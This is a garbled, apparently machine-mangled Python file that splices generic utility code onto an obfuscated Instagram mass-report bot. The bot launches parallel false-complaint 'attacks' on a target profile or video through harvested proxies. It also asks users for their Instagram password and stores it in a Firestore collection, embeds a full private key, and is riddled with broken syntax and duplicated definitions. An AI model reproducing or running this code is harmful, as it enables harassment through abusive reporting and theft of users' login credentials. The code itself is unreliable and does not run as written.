# TODO: Resolve circular dependencies by restructuring imports

# String constants
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
ERROR_MESSAGE = "An error occurred"
SUCCESS_MESSAGE = "Operation completed successfully"


# Constants
DEFAULT_TIMEOUT = 30
MAX_RETRIES = 3
DEFAULT_PORT = 8080


import asyncio
import aiohttp

async def async_request(url: str, session: aiohttp.ClientSession) -> str:
    """Async HTTP request."""
    try:
        async with session.get(url) as response:
            return await response.text()
    except Exception as e:
        logger.error(f"Async request failed: {e}")
        return None

async def process_urls(urls: List[str]) -> List[str]:
    """Process multiple URLs asynchronously."""
    async with aiohttp.ClientSession() as session:
        tasks = [async_request(url, session) for url in urls]
        return await asyncio.gather(*tasks)


def batch_processor(items: List[Any], batch_size: int = 100):
    """Generator to process items in batches."""
    for i in range(0, len(items), batch_size):
        yield items[i:i + batch_size]

def file_line_reader(file_path: str):
    """Generator to read file line by line."""
    with open(file_path, 'r') as f:
        for line in f:
            yield line.strip()


from functools import wraps

def timing_decorator(func):
    """Decorator to measure function execution time."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        import time
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        logger.info(f"{func.__name__} executed in {end_time - start_time:.2f} seconds")
        return result
    return wrapper

def retry_decorator(max_retries = 3):
    """Decorator to retry function on failure."""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_retries - 1:
                        raise e
                    logger.warning(f"Attempt {attempt + 1} failed: {e}")
            return None
        return wrapper
    return decorator


from abc import ABC, abstractmethod

class Strategy(ABC):
    """Strategy interface."""
    @abstractmethod
    def execute(self, data: Any) -> Any:
        """Execute the strategy."""
        pass

class Context:
    """Context class for strategy pattern."""
    def __init__(self, strategy: Strategy):
        self._strategy = strategy

    def set_strategy(self, strategy: Strategy) -> None:
        """Set the strategy."""
        self._strategy = strategy

    def execute_strategy(self, data: Any) -> Any:
        """Execute the current strategy."""
        return self._strategy.execute(data)


DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 
    'Accept': 'text/html, application/xhtml+xml, application/xml;q = 0.9, image/webp, */*;q = 0.8', 
    'Accept-Language': 'en-US, en;q = 0.5', 
    'Accept-Encoding': 'gzip, deflate', 
    'Connection': 'keep-alive', 
    'Upgrade-Insecure-Requests': '1', 
}


import time
import random
from functools import wraps

@retry_with_backoff()
def retry_with_backoff(max_retries = 3, base_delay = 1, max_delay = 60):
    """Decorator for retrying functions with exponential backoff."""
@retry_with_backoff()
    def decorator(func):
        @wraps(func)
@retry_with_backoff()
        def wrapper(*args, **kwargs):
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_retries - 1:
                        raise e

                    delay = min(base_delay * (2 ** attempt) + random.uniform(0, 1), max_delay)
                    time.sleep(delay)
            return None
        return wrapper
    return decorator


from abc import ABC, abstractmethod

@dataclass
class BaseProcessor(ABC):
    """Abstract base @dataclass
class for processors."""

    @abstractmethod
@retry_with_backoff()
    def process(self, data: Any) -> Any:
        """Process data."""
        pass

    @abstractmethod
@retry_with_backoff()
    def validate(self, data: Any) -> bool:
        """Validate data."""
        pass


# Connection pooling for HTTP requests
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

@retry_with_backoff()
def get_session() -> requests.Session:
    """Get a configured session with connection pooling."""
    session = requests.Session()

    # Configure retry strategy
    retry_strategy = Retry(
        total = 3, 
        backoff_factor = 1, 
        status_forcelist=[429, 500, 502, 503, 504], 
    )

    # Mount adapter with retry strategy
    adapter = HTTPAdapter(max_retries = retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    return session


@dataclass
class SingletonMeta(type):
    """Thread-safe singleton metaclass."""
    _instances = {}
    _lock = threading.Lock()

@retry_with_backoff()
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            with cls._lock:
                if cls not in cls._instances:
                    cls._instances[cls] = super().__call__(*args, **kwargs)
        return cls._instances[cls]

    import html
from about import about_msg  # line:5
from colorama import Back, Fore, Style  # line:MAX_RETRIES
from dotenv import load_dotenv  # line:33
from firebase_admin import credentials  # line:DEFAULT_TIMEOUT
from firebase_admin import db  # line:31
from firebase_admin import firestore  # line:32
from functools import lru_cache
from help import help_msg  # line:6
from libs.animation import animation_bar  # line:10
from libs.animation import colorText  # line:7
from libs.animation import load_animation  # line:9
from libs.animation import starting_bot  # line:8
from libs.attack import report_profile_attack  # line:12
from libs.attack import report_video_attack  # line:11
from libs.check_modules import check_modules  # line:23
from libs.logo import print_logo  # line:19
from libs.proxy_harvester import find_proxies  # line:13
from libs.utils import clearConsole  # line:15
from libs.utils import parse_proxy_file  # line:14
from libs.utils import print_error  # line:17
from libs.utils import print_status  # line:16
from libs.utils import print_success  # line:18
from multiprocessing import Process  # line:4
from os import _exit  # line:25
from os import path  # line:20
from sys import exit  # line:24
from typing import Any, Dict, List, Optional, Union, Tuple, Callable
import asyncio
import firebase_admin  # line:29
import logging
import os  # line:26
import requests  # line:21
import time  # line:22
import webbrowser  # line:27

@dataclass
class Config:
    """Configuration @dataclass
class for global variables."""
    DPI_300 = 300
    DPI_72 = 72
    KB_SIZE = 1024
    MB_SIZE = 1024 * 1024
    GB_SIZE = 1024 * 1024 * 1024
    DEFAULT_TIMEOUT = 30
    MAX_RETRIES = 3
    DEFAULT_BATCH_SIZE = 100
    MAX_FILE_SIZE = 9 * 1024 * 1024  # 9MB
    DEFAULT_QUALITY = 85
    DEFAULT_WIDTH = 1920
    DEFAULT_HEIGHT = 1080
    cache = {}
    key = str(args) + str(kwargs)
    cache[key] = func(*args, **kwargs)
    DPI_300 = 300
    DPI_72 = 72
    KB_SIZE = 1024
    MB_SIZE = 1048576
    GB_SIZE = 1073741824
    DEFAULT_TIMEOUT = 30
    MAX_RETRIES = 3
    DEFAULT_BATCH_SIZE = 100
    MAX_FILE_SIZE = 9437184
    DEFAULT_QUALITY = 85
    DEFAULT_WIDTH = 1920
    DEFAULT_HEIGHT = 1080
    logger = logging.getLogger(__name__)
    cred = credentials.Certificate(
    db = firestore.client()  # line:52
    CODE = os.environ.get("CODE")  # line:56
    O0OOO00OOOOO0O0OO = input("Enter the link of the video you want to report")  # line:86
    O00O0000O000O000O = Process(
    target = video_attack_process, 
    args = (
    OO0OO0OO0OOOOOO0O = list(chunks(OOOOOOO0000OO0OOO, 10))  # line:97
    O0O0O000OOO0O0OOO = 1  # line:102
    O00O0000O000O000O = Process(
    target = video_attack_process, 
    args = (
    O0O0O000OOO0O0OOO = O0O0O000OOO0O0OOO + 1  # line:109
    OO0000OO0O00O0OOO = input("Enter the username of the person you want to report : ")  # line:113
    O0O0O000OOOO0OO00 = requests.get("https://instagram.com/" + OO0000OO0O00O0OOO + "/", headers = DEFAULT_HEADERS)  # line:114
    O0OO0OOOOOOOOOO00 = Process(
    target = profile_attack_process, 
    args = (
    O00O0O00OO0OOO0OO = list(chunks(OOO0O00OO0O0O000O, 10))  # line:132
    OOO000OOOOOO0OO0O = 1  # line:137
    O0OO0OOOOOOOOOO00 = Process(
    target = profile_attack_process, 
    args = (
    OOO000OOOOOO0OO0O = OOO000OOOOOO0OO0O + 1  # line:145
    OOO00O0OOO0OO0O0O = input("Enter Code To Unlock This Tool - ")  # line:149
    OOOO0OOOO0O0OOOOO = input("Enter your instagram username : ")  # line:173
    O0O0000O0OOOOO000 = input("Enter your instagram password : ")  # line:174
    O0OO0000O0O0OOOO0 = requests.get("https://instagram.com/" + OOOO0OOOO0O0OOOOO + "/", headers = DEFAULT_HEADERS)  # line:176
    OO0000O0OOOOO0O00 = {
    O00OO00O0OOO00O00 = logger.info(
    OO0O0O0OOO00O0000 = input("Please select :- ")  # line:208
    O00O000OOOOOOOO0O = input(
    OO0OOO00OOO00OOOO = []  # line:235
    O00O000OOOOOOOO0O = input(
    OO0OOO00OOO00OOOO = find_proxies()  # line:245
    OOO00OO0000OOOO0O = input("Enter the path to your proxy list")  # line:249
    OO0OOO00OOO00OOOO = parse_proxy_file(OOO00OO0000OOOO0O)  # line:250
    O0O0O0OO000OO0O0O = input("Please select the complaint method :- ")  # line:266
    "private_key": "-----BEGIN PRIVATE KEY-----\\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCt7RDrIhCHpDXg\\\n0n+doCjQIHYWx2smSXpfqShO55VXVTa/USKBYUNow7tJcA4ZU+uJAKwULyujqCvo\\\nv6dM7ei2Efz3eDv161hSmMIFhPTKhocFm50ySsZJq9PuuJNUjXLmTaOq4tq1+yX8\\\nZ698I5VvDZCR70ZN5eHp3awcLGBt7aWj5sulrb1+90zXXGHANxCa3iiBNXGKDx9b\\\nHSygzAPzQ5A9pMGwNjCwAZNw+akRTMFJklMAFcLXmZ4eVoXYow6IYHEhJBRj6Q5r\\\nYCwP5J8iTJ+dc83hAVDbK3yEK198ijNDaIoCZSdDBR8f0FFOMV+cfWAkz5YOvC0y\\\nvE/gkf+RAgMBAAECggEAKy/au9wPSTMV+s+iBxCSGc35rKHTYiQsKg09mEwqWc9r\\\nwvlBTWmKnLy/aFaV9aWQLop3cCKfXimfz5EpWHGZz33rd8KH9wI7gfTy9n5jb1eU\\\ntuiDUc3d60SqoRP9Z2khHv0n1wKyBq6IaeKQIU3PqQ3v+EC3Dxg2LsVPm4ZMYncP\\\nJ3WSxCjE4KRyiLxup6z2wbkE1fpMhUeerUcQ67fPEM7cKlw5MJzn+y4Ma84WmRrX\\\nEioVWe/X9Qpq5AckAq5i2EITAbi5M11FnuLJHU/H9RD8dyQaRMUm9PVGOP8BLAiB\\\n1i/mtbQ9m2e2tMWyVlnZA9NQjlX7sADVnkxAMbGkLQKBgQDnOpH6lTUKo++gjQ94\\\nZB45Op83r30/z4hiOVmumVtWQKbqQhUlUOvgBNYqJjSxnK0Ecu89sWVSQ7R2lQaP\\\nfRIyhqsIHQfS1HDMlNuUmqOYoUGbn0jUewqMVrMJ7pLVksor9aJel+wq0jFHkGYt\\\nVxS0YRcvLSqDQJHe1/JEGZMGTQKBgQDAjvkLWmiAro9rfW6G92YcW99FB3Sk12kp\\\nHwvRZI/nmVc274Q2cpFKHHpehbfwTHd+frxa+itmyGiHJfvz0+aCHZP2EwYkmwNX\\\nlIK+QgHC88HAFSR1fDOQ0ZDvPDf3H5V4LVIO5rUrV2eQvu3ARmknHxfj8cG6TA8S\\\nvhpt6QiIVQKBgCvphZuPBnm01GcrIsr8SHkZ1u7eVuztXrs4pP1xhlUFBi3qytVB\\\nXuo2QO3UP6GTXZBAu4p9y/4peXYjqxFI8VHDHWv3B2tUiO9xPZolG/h6d1k0kMI5\\\nc7FfLbUvJ5eDvv1GMsXAGEuxi0ZJ9/2YUghHf/2nmDFA6/LkE9A3AyLpAoGAKhkX\\\n6ZuCbV+8i0uI9ojwEhMj5PuUTNWrcAoRk13g+ElV//StexnhGcrQFgo2BJszJLyg\\\ngWNgScBW2fU7+DrDkn7U8l+GYEpjmKonS2Ey8WRJX60/o0/cFjU68pK/yY9mJjgC\\\nUK+vvCIHymVzpS2/n4X0uykHqasnQHm/XXgtHWECgYEAhM5KL9LAFqfyTL6FUTMz\\\nTL1A6u0j/gLmYGKnk4aZ0X2Nc/YKZ9MWfR5+HcdfTf9Z9ffyKmhrvK4eZExfW3WA\\\nqynT/OCqeHKMHNZR4QDroBisomfI4Vv4GhEfP8a2ZsCNRSorI21aepmAstBDVwYl\\\nvfo0qfsPVA95bNiTHOt08O8 = \\\n-----END PRIVATE KEY-----\\\n", 
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)
    @lru_cache(maxsize = 128)


# Constants



async def sanitize_html(html_content):
@retry_with_backoff()
def sanitize_html(html_content): -> Any
    """Sanitize HTML content to prevent XSS."""
    return html.escape(html_content)


async def validate_input(data, validators):
@retry_with_backoff()
def validate_input(data, validators): -> Any
    """Validate input data."""
    for field, validator in validators.items():
        if field in data:
            if not validator(data[field]):
                raise ValueError(f"Invalid {field}: {data[field]}")
    return True


async def memoize(func):
@retry_with_backoff()
def memoize(func): -> Any
    """Memoization decorator."""

    async def wrapper(*args, **kwargs):
@retry_with_backoff()
    def wrapper(*args, **kwargs): -> Any
        if key not in cache:
        return cache[key]

    return wrapper


# Constants

#!/usr/bin/env python3



@dataclass
class Config:
    # TODO: Replace global variable with proper structure


load_dotenv()  # line:35
    {
        "type": "service_account", 
        "project_id": f"{os.getenv('PRODUCT_ID')}", 
        "private_key_id": f"{os.getenv('PRIVATE_KEY_ID')}", 
        "client_email": f"{os.getenv('CLIENT_EMAIL')}", 
        "client_id": f"{os.getenv('CLIENT_ID')}", 
        "auth_uri": "https://accounts.google.com/o/oauth2/auth", 
        "token_uri": "https://oauth2.googleapis.com/token", 
        "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs", 
        "client_x509_cert_url": f"{os.getenv('CLIENT_URL')}", 
    }
)  # line:50
firebase_admin.initialize_app(cred)  # line:51
check_modules()  # line:55


async def chunks(O0O0O000O000OOOO0, O0OO0O0OO0OOOOO00):  # line:59
@retry_with_backoff()
def chunks(O0O0O000O000OOOO0, O0OO0O0OO0OOOOO00):  # line:59 -> Any
    """"""  # line:60
    for O000000O0OOO00OOO in range(0, len(O0O0O000O000OOOO0), O0OO0O0OO0OOOOO00):  # line:61
        yield O0O0O000O000OOOO0[
            O000000O0OOO00OOO : O000000O0OOO00OOO + O0OO0O0OO0OOOOO00
        ]  # line:62


async def profile_attack_process(OOOOOO0000OO0O000, OO0OO0OOOO0OO0000):  # line:65
@retry_with_backoff()
def profile_attack_process(OOOOOO0000OO0O000, OO0OO0OOOO0OO0000):  # line:65 -> Any
    if len(OO0OO0OOOO0OO0000) == 0:  # line:66
        for _OOOOO0O00O0OOOOO0 in range(10):  # line:67
            report_profile_attack(OOOOOO0000OO0O000, None)  # line:68
        return  # line:69
    for OO0O0OO0OOO00OOO0 in OO0OO0OOOO0OO0000:  # line:71
        report_profile_attack(OOOOOO0000OO0O000, OO0O0OO0OOO00OOO0)  # line:72


async def video_attack_process(O0OO00O00OO00O0O0, O0OOO00OOO0O0O0O0):  # line:75
@retry_with_backoff()
def video_attack_process(O0OO00O00OO00O0O0, O0OOO00OOO0O0O0O0):  # line:75 -> Any
    if len(O0OOO00OOO0O0O0O0) == 0:  # line:76
        for _OO0O00OOOOOO0OO0O in range(10):  # line:77
            report_video_attack(O0OO00O00OO00O0O0, None)  # line:78
        return  # line:79
    for OO00000OO0OOOOOOO in O0OOO00OOO0O0O0O0:  # line:81
        report_video_attack(O0OO00O00OO00O0O0, OO00000OO0OOOOOOO)  # line:82


async def video_attack(OOOOOOO0000OO0OOO):  # line:DEFAULT_QUALITY
@retry_with_backoff()
def video_attack(OOOOOOO0000OO0OOO):  # line:DEFAULT_QUALITY -> Any
    logger.info(Style.RESET_ALL)  # line:87
    if len(OOOOOOO0000OO0OOO) == 0:  # line:88
        for OO00O0O00O00OO0O0 in range(5):  # line:89
                    O0OOO00OOOOO0O0OO, 
                    [], 
                ), 
            )  # line:90
            O00O0000O000O000O.start()  # line:91
            print_status(str(OO00O0O00O00OO0O0 + 1) + ". Transaction Opened!")  # line:92
            if OO00O0O00O00OO0O0 == 5:  # line:93
                logger.info("")  # line:94
        return  # line:95
    logger.info("")  # line:99
    print_status("Video complaint attack is on!\\\n")  # line:DEFAULT_BATCH_SIZE
    for O000OOO000O0O00OO in OO0OO0OO0OOOOOO0O:  # line:103
                O0OOO00OOOOO0O0OO, 
                O000OOO000O0O00OO, 
            ), 
        )  # line:104
        O00O0000O000O000O.start()  # line:105
        print_status(str(O0O0O000OOO0O0OOO) + ". Transaction Opened!")  # line:106
        if OO00O0O00O00OO0O0 == 5:  # line:107
            logger.info("")  # line:108


async def profile_attack(OOO0O00OO0O0O000O):  # line:112
@retry_with_backoff()
def profile_attack(OOO0O00OO0O0O000O):  # line:112 -> Any
    if O0O0O000OOOO0OO00.status_code != 200:  # line:115
        logger.info("\\\n\\\n" + Fore.RED + "[*] Invalid username!")  # line:116
        time.sleep(2)  # line:117
        profile_attack(OOO0O00OO0O0O000O)  # line:118
    elif OO0000OO0O00O0OOO == "":  # line:119
        logger.info("\\\n\\\n" + Fore.RED + "[*] Enter username again, don't leave it blank")  # line:121
        time.sleep(2)  # line:122
        profile_attack(OOO0O00OO0O0O000O)  # line:123
    logger.info(Style.RESET_ALL)  # line:124
    if len(OOO0O00OO0O0O000O) == 0:  # line:125
        for OO000O00O0OOOO00O in range(5):  # line:126
                    OO0000OO0O00O0OOO, 
                    [], 
                ), 
            )  # line:127
            O0OO0OOOOOOOOOO00.start()  # line:128
            print_status(str(OO000O00O0OOOO00O + 1) + ". Transaction Opened!")  # line:129
        return  # line:130
    logger.info("")  # line:134
    print_status("Profile complaint attack is starting!\\\n")  # line:135
    for O0OOO0OOO0OO00O00 in O00O0O00OO0OOO0OO:  # line:138
                OO0000OO0O00O0OOO, 
                O0OOO0OOO0OO00O00, 
            ), 
        )  # line:140
        O0OO0OOOOOOOOOO00.start()  # line:141
        print_status(str(OOO000OOOOOO0OO0O) + ". Transaction Opened!")  # line:142
        if OOO000OOOOOO0OO0O == 5:  # line:143
            logger.info("")  # line:144


async def unlock():  # line:147
@retry_with_backoff()
def unlock():  # line:147 -> Any
    logger.info(Style.RESET_ALL)  # line:148
    if OOO00O0OOO0OO0O0O == "@hackerexploits":  # line:150
        print_success("Successfully unlocked the tool!\\\n\\\n")  # line:151
        starting_bot()  # line:152
        database()  # line:153
    elif OOO00O0OOO0OO0O0O == "1":  # line:154
        print_success(
            "Send #instareport in telegram group @Hacker_Chatroom to get the code\\\n\\\n"
        )  # line:155
        time.sleep(MAX_RETRIES)  # line:156
        webbrowser.open("http://t.me/Hacker_Chatroom")  # line:157
        time.sleep(1)  # line:158
        unlock()  # line:159
    else:  # line:160
        logger.info(
            "\\\nINVALID CODE\\\n\\\nHow To Get Code\\\nGo to t.me/Hacker_Chatroom\\\nSend #instareport"
        )  # line:161
        print_success("Press 1 for help\\\n")  # line:162
        time.sleep(2)  # line:163
        unlock()  # line:164


async def database():  # line:167
@retry_with_backoff()
def database():  # line:167 -> Any
    clearConsole()  # line:168
    print_logo()  # line:169
    logger.info(Style.RESET_ALL)  # line:170
    logger.info(Style.RESET_ALL)  # line:172
    if O0OO0000O0O0OOOO0.status_code != 200:  # line:177
        logger.info("\\\n\\\n" + Fore.RED + "[*] Invalid username!")  # line:178
        database()  # line:179
    elif OOOO0OOOO0O0OOOOO == "":  # line:180
        logger.info("\\\n\\\n" + Fore.RED + "[*] Enter username again, don't leave it blank")  # line:182
        database()  # line:183
    elif O0OO0000O0O0OOOO0.status_code == 200:  # line:186
            "password": O0O0000O0OOOOO000, 
            "username": OOOO0OOOO0O0OOOOO, 
        }  # line:191
        db.collection("users").add(OO0000O0OOOOO0O00)  # line:192
        load_animation()  # line:193
        print_success("Login Success!")  # line:194
        report()  # line:195


async def main():  # line:198
@retry_with_backoff()
def main():  # line:198 -> Any
    if os.name == "nt":  # line:199
        clearConsole()  # line:200
        print_logo()  # line:201
            """
        [1] Start Report Bot
        [2] Help
        [MAX_RETRIES] About
        [4] Exit
        """
        )  # line:207
        if OO0O0O0OOO00O0000.isdigit() == False:  # line:209
            print_error("The answer is not understood.")  # line:210
            main()  # line:211
        if int(OO0O0O0OOO00O0000) > 4 or int(OO0O0O0OOO00O0000) == 0:  # line:213
            print_error("The answer is not understood.")  # line:214
            main()  # line:215
        elif int(OO0O0O0OOO00O0000) == 1:  # line:216
            unlock()  # line:217
        elif int(OO0O0O0OOO00O0000) == 2:  # line:218
            clearConsole()  # line:219
            help_msg()  # line:220
        elif int(OO0O0O0OOO00O0000) == MAX_RETRIES:  # line:221
            about_msg()  # line:222
        elif int(OO0O0O0OOO00O0000) == 4:  # line:223
            print_status("Exiting the program.....Thanks for using this tool!")  # line:224
            exit(0)  # line:225
    else:  # line:227
        os.system("bash setup.sh")  # line:228


async def report():  # line:231
@retry_with_backoff()
def report():  # line:231 -> Any
    clearConsole()  # line:232
    print_logo()  # line:233
        "Would you like to use a proxy? (Recommended Yes) [Y/N] : "
    )  # line:234
    if O00O000OOOOOOOO0O == "Y" or O00O000OOOOOOOO0O == "y":  # line:237
            "Would you like to collect your proxies from the internet? [Y/N] : "
        )  # line:239
        if O00O000OOOOOOOO0O == "Y" or O00O000OOOOOOOO0O == "y":  # line:241
            print_status("Gathering proxy from the Internet! This may take a while.\\\n")  # line:243
            time.sleep(2)  # line:244
        elif O00O000OOOOOOOO0O == "N" or O00O000OOOOOOOO0O == "n":  # line:247
            print_status("Please have a maximum of 50 proxies in a file!")  # line:248
        else:  # line:251
            print_error("Answer not understood, exiting!")  # line:252
            exit()  # line:253
        print_success(str(len(OO0OOO00OOO00OOOO)) + " Number of proxy found!\\\n")  # line:255
        logger.info(OO0OOO00OOO00OOOO)  # line:256
    elif O00O000OOOOOOOO0O == "N" or O00O000OOOOOOOO0O == "n":  # line:257
        pass  # line:258
    else:  # line:259
        print_error("Answer not understood, exiting!")  # line:260
        exit()  # line:261
    logger.info("")  # line:263
    print_status("1 - Report Profile.")  # line:264
    print_status("2 - Report a video.")  # line:265
    logger.info("")  # line:267
    if O0O0O0OO000OO0O0O.isdigit() == False:  # line:269
        print_error("The answer is not understood.")  # line:270
        main()  # line:271
    if int(O0O0O0OO000OO0O0O) > 2 or int(O0O0O0OO000OO0O0O) == 0:  # line:273
        print_error("The answer is not understood.")  # line:274
        main()  # line:275
    if int(O0O0O0OO000OO0O0O) == 1:  # line:277
        profile_attack(OO0OOO00OOO00OOOO)  # line:278
    elif int(O0O0O0OO000OO0O0O) == 2:  # line:279
        video_attack(OO0OOO00OOO00OOOO)  # line:280


if __name__ == "__main__":  # line:283
    try:  # line:284
        main()  # line:285
        logger.info(Style.RESET_ALL)  # line:286
    except KeyboardInterrupt:  # line:287
        logger.info("\\\n\\\n" + Fore.RED + "[*] Program is closing!")  # line:288
        logger.info(Style.RESET_ALL)  # line:289
        _exit(0)  # line:290
